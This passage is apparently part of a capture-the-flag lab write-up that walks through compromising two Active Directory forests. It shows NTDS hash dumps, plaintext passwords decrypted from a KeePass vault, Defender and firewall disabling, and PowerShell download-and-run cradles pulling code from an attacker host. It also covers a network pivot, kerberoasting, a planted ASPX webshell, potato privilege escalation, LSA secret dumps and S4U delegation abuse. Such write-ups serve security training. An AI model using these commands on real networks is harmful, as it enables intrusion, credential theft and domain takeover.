SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\j.walsh:9488:aad3b435b51404eeaad3b435b51404ee:ac93d1dc286887e281ccbb34705778f7:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\p.sullivan:9489:aad3b435b51404eeaad3b435b51404ee:62713727a3981c8b9192212b6de1428c:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\t.russell:9490:aad3b435b51404eeaad3b435b51404ee:1552ea69efde16390cf11f7486a58bb6:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\c.anderson:9494:aad3b435b51404eeaad3b435b51404ee:b4e751638569d552ceab27133e249044:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\b.wellington:9495:aad3b435b51404eeaad3b435b51404ee:3796b4f1feb088aa16a30f03f5ca4cfe:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_files:9503:aad3b435b51404eeaad3b435b51404ee:0eb58f71ee3cd38f9e695b3270596a9f:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_web:9506:aad3b435b51404eeaad3b435b51404ee:bec064a5c94d5725f737260d815d97d7:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_krb_t2:9508:aad3b435b51404eeaad3b435b51404ee:8bd7ff5bf2b9c11fcd54377575887b1d:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.pherson:9509:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\j.dillon:9510:aad3b435b51404eeaad3b435b51404ee:8bd7ff5bf2b9c11fcd54377575887b1d:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\t.dixon:9511:aad3b435b51404eeaad3b435b51404ee:e02831e354d2c33a4c760d947a11431d:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.collins:9512:aad3b435b51404eeaad3b435b51404ee:071d882abec2bae4f6589da7cc799503:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\d.hoff:9514:aad3b435b51404eeaad3b435b51404ee:e46f553a54dbe496ae984449956b1a07:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\b.jones:9515:aad3b435b51404eeaad3b435b51404ee:c0b491d9e1c67a532248b50863646dfc:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\a.owen:9516:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\researchoperator:9519:aad3b435b51404eeaad3b435b51404ee:dbf9e64c209385f4688eaa202f9a4ff5:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\svc_webmonitor:9521:aad3b435b51404eeaad3b435b51404ee:64bc4335cee71420e11bc2eb8dc09396:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\j.bennett:10606:aad3b435b51404eeaad3b435b51404ee:dfedefef8a91e3f768d240c34962c633:::
SMB         dc.westbridge.hsm 445    DC               westbridge.hsm\s.adams:10608:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
SMB         dc.westbridge.hsm 445    DC               root:11601:aad3b435b51404eeaad3b435b51404ee:7e863f3dec467471b9a747552c96aea2:::
SMB         dc.westbridge.hsm 445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:e841cefed4552f68d7a4458e57136386:::
SMB         dc.westbridge.hsm 445    DC               SQL$:9460:aad3b435b51404eeaad3b435b51404ee:f39f4ffb344e31bd81a93854f655f63f:::
SMB         dc.westbridge.hsm 445    DC               FILES$:9499:aad3b435b51404eeaad3b435b51404ee:417d6bcf87929bfcd9561833bbebbd50:::
SMB         dc.westbridge.hsm 445    DC               WEB$:9504:aad3b435b51404eeaad3b435b51404ee:793e12284a4b809a990aa06279092164:::
SMB         dc.westbridge.hsm 445    DC               HELPDESK-WS$:10610:aad3b435b51404eeaad3b435b51404ee:6106732e6b84141c144b81ddc105a27e:::
SMB         dc.westbridge.hsm 445    DC               WBRESEARCH$:9518:aad3b435b51404eeaad3b435b51404ee:59ee991a9ac8f54e35810d04eff8d1ab:::
SMB         dc.westbridge.hsm 445    DC               [+] Dumped 48 NTDS hashes to /home/kaladin/.nxc/logs/ntds/DC_dc.westbridge.hsm_2026-08-23_202734.ntds of which 42 were added to the database
SMB         dc.westbridge.hsm 445    DC               [*] To extract only enabled accounts from the output file, run the following command:
SMB         dc.westbridge.hsm 445    DC               [*] grep -iv disabled /home/kaladin/.nxc/logs/ntds/DC_dc.westbridge.hsm_2026-08-23_202734.ntds | cut -d ':' -f1
```

Three details in this dump are worth their weight:

* **`j.dillon` at RID 9510** — the "hidden account" from [Section 9.4](#non-default-acl-edges), resolved by evidence rather than inference. Its restored friends `t.dixon` (9511) and `a.collins` (9512) sit right next to it in RID order.
* **`root` at RID 11601** — our own creation from [Section 15.5](#way-2-kerberos-as-the-privilege-escalation) Way #2. The AD user we minted to become Linux root now lives permanently in NTDS. Cleanup on a real engagement; receipt here.
* **`WBRESEARCH$` at RID 9518** — the **inter-realm trust account**, sitting in *this* domain's NTDS. Its secret is the shared key both KDCs use to encrypt cross-realm referrals — file it away for [Section 19.3](#cross-realm-tickets-how-the-trust-actually-works) and [Section 20.6](#s4u-as-administrator-dcsync-flag07).

And of course every user hash in the home forest, including a fresh `krbtgt` — golden tickets for `westbridge.hsm` are mintable from here on.

# 19. Crossing the Trust — WESTBRIDGE-RESEARCH.HSM

## 19.1 The Paper Trail — Forest_Trust_Validation.eml

Two files were sitting on the DC Administrator's desktop, and both matter:

* **Database.kdb** — a KeePass vault (locked for now)
* **Forest_Trust_Validation.eml** — the validation memo for the trust itself


```bash
PS C:\Users\Administrator\Desktop> !download Database.kdb
downloading C:\Users\Administrator\Desktop\Database.kdb
done, writing to /home/kaladin/CTF/HackSmarter/Ranges/WestbridgeUniversity/www/Database.kdb

PS C:\Users\Administrator\Desktop> !download Forest_Trust_Validation.eml
downloading C:\Users\Administrator\Desktop\Forest_Trust_Validation.eml
done, writing to /home/kaladin/CTF/HackSmarter/Ranges/WestbridgeUniversity/www/Forest_Trust_Validation.eml
```

```bash
➜ cat Forest_Trust_Validation.eml
Hello,

As part of the validation of the recently established forest trust between WESTBRIDGE.HSM and WESTBRIDGE-RESEARCH.HSM, the researchoperator account in the WESTBRIDGE.HSM forest has been authorized to authenticate to the WESTBRIDGE-RESEARCH.HSM forest via the established cross-realm trust. The account has been designated as the owner of the Research Web Operations Global Security Group, which manages authorized operational access to the research web infrastructure.

Please note that the WESTBRIDGE-RESEARCH.HSM forest enforces Kerberos-only authentication for domain access. NTLM is disabled for domain authentication and LDAP access as part of the security baseline. Consequently, all domain logons, LDAP communication, and cross-forest authentication to the research forest must be performed using Kerberos.

The credentials required for the validation process are stored in the attached KeePass database.

KeePass Password: eJ6jSnz1z7T4chkJ

If you encounter any Kerberos, LDAP, or cross-forest authentication issues during testing, please notify the Infrastructure Services team.

Regards,

Administrator
WESTBRIDGE.HSM / WESTBRIDGE-RESEARCH.HSM
```

Three facts, straight from the org's own documentation:

1. **`researchoperator` is our bridge account** — explicitly authorized across the trust.
   Remember it? It's been sitting in every dump since the first LDAP pull, looking like an
   oddball. It's the *designated* door.
2. **It owns "Research Web Operations"** — the group controlling access to research web
   infrastructure. (This is the group from the support-portal chat!)
3. **NTLM is disabled in the research forest** — Kerberos only. That kills password-spray,
   relay, and every `-p 'pass'` habit. From here on: tickets or nothing (`-k`, ccache,
   KRB5CCNAME everywhere).

And then fact four, the one that pays: **the memo ships the vault's master password.** Open `Database.kdb` with `eJ6jSnz1z7T4chkJ`:

```bash
python312 ➜ python3 -m pip install kppy

python312 ➜ cat << 'EOF' > decrypt-kdb.py
import sys

try:
    # Updated class name for kppy legacy support
    from kppy.database import KPDBv1
except ImportError:
    print("❌ Error: kppy library is missing or configured incorrectly.")
    sys.exit(1)

try:
    # Open legacy 1.x KDB format using KPDBv1
    db = KPDBv1(filepath='Database.kdb', password='eJ6jSnz1z7T4chkJ')
    db.load()

    print("🔒 Decryption Successful! Extracting 16 entries:\n")
    print("=" * 60)

    for entry in db.entries:
        print(f"📁 Group:    {entry.group}")
        print(f"📌 Title:    {entry.title}")
        print(f"👤 Username: {entry.username}")
        print(f"🔑 Password: {entry.password}")
        print("-" * 60)

except Exception as e:
    print(f"❌ System Error: {e}")
EOF

python312 ➜ python3 decrypt-kdb.py
🔒 Decryption Successful! Extracting 16 entries:

============================================================
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef186b0>
📌 Title:    Support Portal
👤 Username: s.harrison
🔑 Password: VJeoxibMaSaj
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef19670>
📌 Title:    svc_mssql
👤 Username: svc_mssql
🔑 Password: sqls3rv3r
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef19670>
📌 Title:    svc_webmonitor
👤 Username: svc_webmonitor
🔑 Password: eazypassword
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef19670>
📌 Title:    svc_files
👤 Username: svc_files
🔑 Password: gUfbs2ikWNPudp5
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef19670>
📌 Title:    svc_web
👤 Username: svc_web
🔑 Password: WebSvc!2026#Random
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef19670>
📌 Title:    svc_krb_t2
👤 Username: svc_krb_t2
🔑 Password: tmGhdR1pkPfYL4322
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef198e0>
📌 Title:    svc_web
👤 Username: svc_web
🔑 Password: WebSvc!2026#Random
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef198e0>
📌 Title:    id_ed25519
👤 Username: id_ed25519
🔑 Password:
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef19dc0>
📌 Title:    researchoperator
👤 Username: researchoperator
🔑 Password: XWkZ9o5T0c65djgYWl
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef1b290>
📌 Title:    Default Domain Password
👤 Username:
🔑 Password: Welcome2Westbridge!
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef18f50>
📌 Title:    sa
👤 Username: sa
🔑 Password: SqlS3rv3r!2026!!
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef198e0>
📌 Title:    d.reynolds
👤 Username: d.reynolds
🔑 Password: Password123
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7ef198e0>
📌 Title:    e.mitchell
👤 Username: e.mitchell
🔑 Password: YH&O2G:E'jcTc[Y*
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7eef6b40>
📌 Title:    Meta-Info
👤 Username: SYSTEM
🔑 Password:
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7eef6b40>
📌 Title:    Meta-Info
👤 Username: SYSTEM
🔑 Password:
------------------------------------------------------------
📁 Group:    <kppy.groups.v1Group object at 0x7efe7eef6b40>
📌 Title:    Meta-Info
👤 Username: SYSTEM
🔑 Password:
------------------------------------------------------------
```


**`researchoperator : XWkZ9o5T0c65djgYWl`** — the bridge account's plaintext, courtesy of the org documenting its own trust.

## 19.2 Network Pivot — Reaching 10.0.20.0/24

```bash
PS C:\programdata> Set-MpPreference -DisableRealtimeMonitoring $true

PS C:\programdata> IEX(New-Object Net.WebClient).DownloadString("http://192.168.211.2/Get-PingSweep.ps1")
PS C:\programdata> Get-PingSweep -SubNet '10.0.20'

Address     Status RoundtripTime
-------     ------ -------------
10.0.20.5  Success             0
10.0.20.10 Success             1
```

The research subnet isn't routable from tun0. With SYSTEM-equivalent on the DC, ligolo-ng turns DC01 into the router:

```bash
# Attacker
➜ sudo ./proxy -selfcert
ligolo-ng » interface_create --name ligolo

# On DC (WinRM session)
PS > certutil -urlcache -f -split http://192.168.211.2/agent.exe agent.exe
PS > Start-Process .\agent.exe -ArgumentList "-connect 192.168.211.2:11601 -ignore-cert" -WindowStyle Hidden

ligolo-ng » session 1                      # pick the DC agent
ligolo-ng » add_route --name ligolo --route 10.0.20.0/24
ligolo-ng » start

# Confirm Pivot
➜ fping -aqg 10.0.20.0/24
10.0.20.5
10.0.20.10

➜ nmap -Pn -p 445 10.0.20.10
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
```

Two operational notes from the run: Defender got switched off before dropping tooling (`Set-MpPreference -DisableRealtimeMonitoring $true`), and when the WinRM session died mid-tunnel the agent recovered cleanly with `tunnel_list` ➜ restart `agent.exe` — but only after `Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False`, because the DC's firewall profiles were all still enabled and silently eating reconnects.

A PowerShell ping sweep from the DC confirms two live research hosts: **10.0.20.5 (DC02)** and **10.0.20.10 (WEB — the research web server)**. A quick SMB fingerprint from the attacker side through the tunnel agrees:

```bash
➜ nxc smb 10.0.20.0/24
SMB         10.0.20.10      445    WEB              [*] Windows 11 / Server 2025 Build 26100 x64 (name:WEB) (domain:westbridge-research.hsm) (signing:True) (SMBv1:False)
SMB         10.0.20.5       445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
```

Hosts file + a **dual-realm krb5.conf** so both KDCs resolve:

```bash
# Update Hosts
10.0.20.5      DC02.westbridge-research.hsm westbridge-research.hsm DC02
10.0.20.10     WEB.westbridge-research.hsm WEB

# Update krbg config
cat <<EOF | sudo tee /tmp/krb5.conf
[libdefaults]
dns_lookup_kdc = false
dns_lookup_realm = false
default_realm = WESTBRIDGE.HSM
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
WESTBRIDGE.HSM = {
    kdc = dc.westbridge.hsm
    admin_server = dc.westbridge.hsm
    default_domain = westbridge.hsm
}

WESTBRIDGE-RESEARCH.HSM = {
    kdc = dc02.westbridge-research.hsm
    admin_server = dc02.westbridge-research.hsm
    default_domain = westbridge-research.hsm
}

[domain_realm]
.westbridge.hsm = WESTBRIDGE.HSM
westbridge.hsm = WESTBRIDGE.HSM
.westbridge-research.hsm = WESTBRIDGE-RESEARCH.HSM
westbridge-research.hsm = WESTBRIDGE-RESEARCH.HSM
EOF
```

## 19.3 Cross-Realm Tickets — How the Trust Actually Works

Get a TGT at home, then ask for a service in the *other* forest:

```bash
➜ getTGT.py westbridge.hsm/researchoperator:'XWkZ9o5T0c65djgYWl' \
    -dc-ip 10.0.10.5
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in researchoperator.ccache

➜ klist researchoperator.ccache
Ticket cache: FILE:researchoperator.ccache
Default principal: researchoperator@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 21:20:36  08/24/2026 07:20:36  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:21:26  08/24/2026 07:20:36  ldap/dc.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35

➜ env KRB5CCNAME=researchoperator.ccache \
rusthound-ce \
    -d westbridge.hsm -f dc.westbridge.hsm -k \
    --zip -c All

➜ env KRB5CCNAME=researchoperator.ccache \
kvno ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM
ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM: kvno = 4

➜ klist researchoperator.ccache
Ticket cache: FILE:researchoperator.ccache
Default principal: researchoperator@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 21:20:36  08/24/2026 07:20:36  krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:21:26  08/24/2026 07:20:36  ldap/dc.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:28:54  08/24/2026 07:20:36  krbtgt/WESTBRIDGE-RESEARCH.HSM@WESTBRIDGE.HSM
        renew until 08/24/2026 21:20:35
08/23/2026 21:28:55  08/24/2026 07:20:36  ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM
        renew until 08/24/2026 21:20:35
```

`klist` afterwards shows the magic — a **referral chain** landed in the cache:

```
krbtgt/WESTBRIDGE.HSM@WESTBRIDGE.HSM              🡐 home TGT
ldap/dc.westbridge.hsm@WESTBRIDGE.HSM             🡐 home service ticket
krbtgt/WESTBRIDGE-RESEARCH.HSM@WESTBRIDGE.HSM     🡐 ★ cross-realm referral ticket
ldap/dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM  🡐 research service ticket!
```

That third entry is the trust made visible: our home DC issued a TGT *for the remote realm*, encrypted with the inter-realm key both sides share (remember `WBRESEARCH$` from the NTDS dump? That trust account's secret *is* that key). The research KDC trusts anything its partner vouches for. No credentials ever crossed the wire — just signed referrals.

BloodHound collection works over this too — same ccache, `-d westbridge-research.hsm -f dc02.westbridge-research.hsm -k`: **10 users, 2 computers** in the whole research forest. Tiny. And the graph connects exactly like the support-portal chat predicted.

## 19.4 Group Type Abuse — Ownership Is Not Permission

Recall the portal conversation ([Section 16.7](#looking-around-the-support-portal)): *"you need to change the group scope to Universal first, then to Domain Local."* Here's the full mechanics of what that chat was teaching, because this stage hides **two separate gotchas** — one about rights, one about scopes.

### Gotcha #1 — "Owner" does not mean "can write"

BloodHound showed `researchoperator` with an **Owns** edge over `Research Web Operations`. Intuition says *owner = full control*, but AD is more subtle:

* **Ownership** grants exactly one implicit right: the ability to **modify the object's
  DACL** (and read it). That's it.
* It does **not** grant `WriteProperty`, `GenericAll`, or any attribute-write right. An
  owner of a locked-down object can't even rename it — until they exercise that one
  implicit right to hand themselves more.

So the first move converts ownership into actual writability — grant ourselves GenericAll using the very right ownership implies:

```bash
# researchoperator's SID from the HOME forest (westbridge.hsm)
➜ env KRB5CCNAME=researchoperator.ccache \
bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' -k ccache=researchoperator.ccache \
    add genericAll 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    'S-1-5-21-1978613116-3728955385-531918137-9519'
[+] S-1-5-21-1978613116-3728955385-531918137-9519 has now GenericAll on CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm
```

Only *now* can we touch the group's attributes.

### Gotcha #2 — You cannot jump scopes; AD enforces the ladder

The attribute that defines what a group *is* is **`groupType`** — one signed integer that encodes both the **scope** and whether the group is **security-enabled**. Decode it in hex:

```
-2147483646  =  0x80000002
                 │ │
                 │ └── 0x00000002 = GLOBAL_GROUP
                 └──── 0x80000000 = SECURITY_ENABLED   🡐 "actually usable for ACLs"
```

| Signed value | Hex | Meaning |
|---|---|---|
| `-2147483646` | `0x80000002` | security-enabled **Global** *(our starting state)* |
| `-2147483640` | `0x80000008` | security-enabled **Universal** |
| `-2147483644` | `0x80000004` | security-enabled **Domain Local** 🡐 accepts cross-domain members |

Our target is `-2147483644` (Domain Local) — cross-domain principals can only join Domain Local groups. But writing `-2147483644` directly onto a Global group bounces with `ERROR_NOT_SUPPORTED`: **AD refuses scope-jumps and forces the ladder**

```
Global ──▶ Universal ──▶ Domain Local        ✅ allowed path
Global ──▶ Domain Local                      ❌ ERROR_NOT_SUPPORTED
```

(Why? Scope transitions have membership implications — going to Universal first lets AD re-validate existing members against forest-wide rules before the group becomes eligible for foreign principals.)

So: two writes, in order —

```bash
# Step 1: Global (-2147483646) ➜ Universal (-2147483640)
➜ env KRB5CCNAME=researchoperator.ccache \
bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' -k ccache=researchoperator.ccache \
    set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    groupType -v '-2147483640'

# Step 2: Universal (-2147483640) ➜ Domain Local (-2147483644)
➜ env KRB5CCNAME=researchoperator.ccache \
bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' -k ccache=researchoperator.ccache \
    set object 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    groupType -v '-2147483644'
```

Verify between steps if you want the receipts (`get object ... --attr groupType`).

### Adding the foreign member

Now the group accepts cross-domain principals. One subtlety when adding ourselves: **use the raw SID**, not the name:

```bash
➜ env KRB5CCNAME=researchoperator.ccache \
bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm \
    -u 'researchoperator' -k ccache=researchoperator.ccache \
    add groupMember 'CN=Research Web Operations,CN=Users,DC=westbridge-research,DC=hsm' \
    'S-1-5-21-1978613116-3728955385-531918137-9519'
```

Why SID-form: `researchoperator` doesn't exist as an object in `westbridge-research.hsm` — there's nothing for a name lookup to resolve to. Cross-forest membership is tracked by SID; the account will materialize later under `CN=ForeignSecurityPrincipals` as `S-1-5-21-<home>-9519`.

One cleanup note from the run: after the scope surgery, `kdestroy` and pull a **fresh TGT** (`getTGT.py westbridge.hsm/researchoperator:'XWkZ9o5T0c65djgYWl'`) — group memberships ride inside the PAC of your tickets, so an old ticket still carries the *old* (groupless) PAC. Fresh TGT = new membership takes effect everywhere: `researchoperator@WESTBRIDGE.HSM` is now inside a research-forest security group which, per the trust memo, *"manages authorized operational access to the research web infrastructure."*

## 19.5 What the Research Graph Says

The fresh collection (10 users / 2 computers) lays out the remaining path in three hops:

| Fact | Consequence |
|---|---|
| **Research Web Operations can reset 3 accounts' passwords** | we own those resets now |
| One of the resettable users: **r.parker** — RDP **and** PowerShell Remoting on the research WEB server | shell on 10.0.20.10 |
| **t.walker** has GenericWrite over **j.bones** | shadow credential / password reset on j.bones |
| **j.bones** ∈ **Research Web Administrators** | admin-tier on the research web box |

Chain preview: `reset r.parker ➜ WinRM to WEB(10.0.20.10)` · `t.walker ➜ j.bones via shadow creds` ➜ `j.bones ∈ Research Web Administrators` ➜ whatever the research web server guards (and its flag). All Kerberos, no passwords over the wire.

*(Section  continues — foothold on the research web server is next...)*

# 20. The Research Forest Falls

## 20.1 Password Resets ➜ Three Identities

With Research Web Operations membership in the PAC, the promised password resets are one bloodyAD call each:

```bash
➜ bloodyAD --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
    -u 'researchoperator' -k ccache=./researchoperator.ccache \
    set password 'r.parker' 'SecretMyth123!'
[+] Password changed successfully!

# same for t.walker (and j.bones later via roast)
```

Then fresh TGTs for each new identity straight from DC02:

```bash
➜ getTGT.py westbridge-research.hsm/r.parker:'SecretMyth123!'  -dc-ip 10.0.20.5
➜ getTGT.py westbridge-research.hsm/t.walker:'SecretMyth123!'  -dc-ip 10.0.20.5
```

## 20.2 r.parker ➜ RDP onto the Research WEB Server

One detour first: nxc's RDP check *fails* for this account with `CredSSP - Server sent an error! Code: 0x80090302` even though the credential is valid — CredSSP negotiation quirk through the tunnel, not a wrong password. Don't trust a single protocol check; go straight at it:

```bash
➜ xfreerdp3 /v:web.westbridge-research.hsm /d:westbridge-research.hsm \
    /u:'r.parker' /p:'SecretMyth123!' /dynamic-resolution /sec:nla /cert:ignore +clipboard

# Alt — fully Kerberos, no password on the command line:
➜ xfreerdp3 /v:WEB.westbridge-research.hsm /u:r.parker /d:WESTBRIDGE-RESEARCH.HSM \
    /sec:nla /kerberos:cache:r.parker.ccache /cert:ignore
```

![RDP session as r.parker](/assets/images/westbridge-rdp-rparker.png)

Local group enumeration confirms why this account was the door — it's a **direct member of the local Administrators** on WEB:

```
WEB\Administrator          Local
WBRESEARCH\r.parker        ActiveDirectory   🡐 local admin via direct membership
WBRESEARCH\Domain Admins   ActiveDirectory
```

## 20.3 j.bones — Targeted Kerberoast + Crack

The t.walker GenericWrite edge gets exercised with `targetedkerberoast` — it sets an SPN on j.bones on the fly, requests the TGS, and cleans up:

```bash
➜ env KRB5CCNAME=t.walker.ccache targetedkerberoast \
    --dc-host dc02.westbridge-research.hsm -d westbridge-research.hsm -u t.walker -k
[+] Printing hash for (j.bones)
$krb5tgs$18$j.bones$WESTBRIDGE-RESEARCH.HSM$...

➜ hashcat -a 0 -m 19700 /tmp/hash.txt /opt/SecLists/rockyou.txt -d 1
Status...........: Cracked      🡐 j.bones : 8brokenbones8
```

(`runas /user:WBRESEARCH\j.bones` from the r.parker RDP session confirms the identity works.)

![RDP shell as j.bones](/assets/images/westbridge-rdp-jbones.png)

## 20.4 Webshell ➜ CrystalPotato ➜ SYSTEM

j.bones is in Research Web Administrators, but IIS still runs code as the app pool. Drop an ASPX shell into `C:\inetpub\wwwroot`. The transfer rides the same ligolo tunnel: `listener_add` binds port 7777 *on the DC agent*, forwarding to our attacker HTTP server — which is why the fetch URL is the **DC's** address (`10.0.10.5:7777`), reachable from the research web box over the trust's routing, even though our own IP never appears:

```powershell
ligolo-ng » listener_add --tcp --to 192.168.211.2:7777 --addr 0.0.0.0:7777
PS > iwr http://10.0.10.5:7777/webshell.aspx -outfile shell.aspx
```

(Defender on this box flagged the first plain webshell — the working copy was a lightly obfuscated variant. Expect AV on any internet-facing IIS server, even in a lab.)

`http://10.0.20.10/shell.aspx` executes as `iis apppool\defaultapppool` — and there's the eternal gift again:

![Webshell — whoami as iis apppool\defaultapppool](/assets/images/westbridge-webshell-whoami.png)

![Webshell — whoami /priv: SeImpersonatePrivilege enabled](/assets/images/westbridge-webshell-privs.png)

CrystalPotato time:

```powershell
> iwr http://10.0.10.5:7777/CrystalPotato.exe -OutFile C:\Programdata\potato.exe
> C:\Programdata\potato.exe -cmd "cmd /c net user Administrator SecretMyth123!"
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
The command completed successfully.
```

![CrystalPotato — whoami as nt authority\system](/assets/images/westbridge-webshell-potato-whoami.png)

![CrystalPotato — Administrator password rotated](/assets/images/westbridge-webshell-potato-admin-passwd.png)

Local admin password rotated ➜ evil-winrm as `web\administrator`:

```bash
➜ evil_winrmexec westbridge-research.hsm/'administrator:SecretMyth123!'@web.westbridge-research.hsm

PS > whoami; hostname
web\administrator
WEB

PS > type ..\Desktop\*
Flag06[Potato_Taste_WEB_0wned]
```

**Flag 6 captured.**

## 20.5 LSA Secrets ➜ The Machine That Owns DC02

Administrator on research-WEB means SAM + LSA dumps:

```bash
➜ nxc smb web.westbridge-research.hsm -u administrator -p 'SecretMyth123!' \
    --local-auth --sam --lsa
SMB  [*] Dumping LSA secrets
SMB  WESTBRIDGE-RESEARCH.HSM/a.howard:$DCC2$10240#a.howard#06d655cd496c750af4211e7a47d3b9a2: (2026-08-23 07:33:37)
SMB  WESTBRIDGE-RESEARCH.HSM/r.parker:$DCC2$10240#r.parker#4cb5aa3a68992cdcae1a248aaad10cc5: (...)
SMB  WESTBRIDGE-RESEARCH.HSM/j.bones:$DCC2$10240#j.bones#3e2edcd3b216cdd30319efa8f7dacd69: (...)
SMB  WBRESEARCH\WEB$:aes256-cts-hmac-sha1-96:1bff63e581469282b52b61d48d0121de60831370117f5f921e6bee7d7f68d6e8
SMB  WBRESEARCH\WEB$:plain_password_hex:2a002d003b004e00...[snip]...
SMB  WBRESEARCH\a.howard:fdCgRAxJq0lY
```

The headline is the **AES256 key of `WEB$`** — and per the BloodHound graph, `WEB$` holds constrained-delegation rights toward the research DC itself. That combination is [Section 20.6](#s4u-as-administrator-dcsync-flag07)'s whole payload: *the machine key of an account trusted to impersonate users against `DC02`*. Machine keys don't rotate out from under you here either (`ad_maximum_machine_account_password_age = 0` pattern again — this time confirmed by the LSA dump carrying both the AES key and a plaintext hex password for WEB$).

But read the rest of that loot table too, because it's a small museum:

| Loot | What it is | What it's worth |
|---|---|---|
| `$DCC2$` entries ×3 | Domain cached credentials (MS-CACHE2) for a.howard, r.parker, j.bones | Crackable offline at `-m 2100`; we didn't need them |
| **`WBRESEARCH\a.howard : fdCgRAxJq0lY`** | a.howard's **plaintext**, stored by whatever service cached it | A live identity in the research forest — see [Appendix B](#appendix-b-the-road-not-taken--ahoward--dc02) |
| `WEB$ plain_password_hex` | The research web server's own machine-account password, in hex | Full `WEB$` identity without Kerberos at all |

Cached domain credentials on a web server are a pattern worth internalizing: anything that ever authenticated *as a domain user* through this box left residue, and local admin turns residue into identities.

## 20.6 S4U as Administrator ➜ DCSync ➜ Flag07

The delegation abuse is now identical to FILES earlier, one forest over:

```bash
➜ bloodyAD \
    --host dc02.westbridge-research.hsm -d westbridge-research.hsm -i 10.0.20.5 \
    -u 'a.howard' \
    -k ccache=./a.howard.ccache \
    add rbcd 'DC02$' 'WEB$'
[!] No security descriptor has been returned, a new one will be created
[+] WEB$ can now impersonate users on DC02$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+ccache://westbridge-research.hsm\a.howard:.%2Fa.howard.ccache@dc02.westbridge-research.hsm/?serverip=10.0.20.5&dc=10.0.20.5' 'HOST/DC02$@westbridge-research.hsm' 'Administrator@westbridge-research.hsm'

➜ getST.py 'westbridge-research.hsm/WEB$' \
    -aesKey 1bff63e581469282b52b61d48d0121de60831370117f5f921e6bee7d7f68d6e8 \
    -spn 'cifs/dc02.westbridge-research.hsm' \
    -dc-ip 10.0.20.5 -impersonate Administrator
Impacket v0.14.0.dev0+20260819.94127.f133bb88 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc02.westbridge-research.hsm@WESTBRIDGE-RESEARCH.HSM.ccache

